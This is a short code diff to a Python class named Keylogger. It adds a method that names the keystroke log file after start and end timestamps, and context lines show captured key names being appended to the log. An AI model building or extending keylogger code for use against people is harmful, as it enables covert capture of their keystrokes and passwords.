@@ -29,3 +29,11 @@ class Keylogger:
                 name = f"[{name.upper()}]"
 
         self.log += name
+
+    def updateFilename(self):
+        """
+            Construct the filename to be identified by start & end datetimes
+        """
+        startDatetimeString = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        endDatetimeString = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        self.fileName = f"keylog-{startDatetimeString}_{endDatetimeString}"
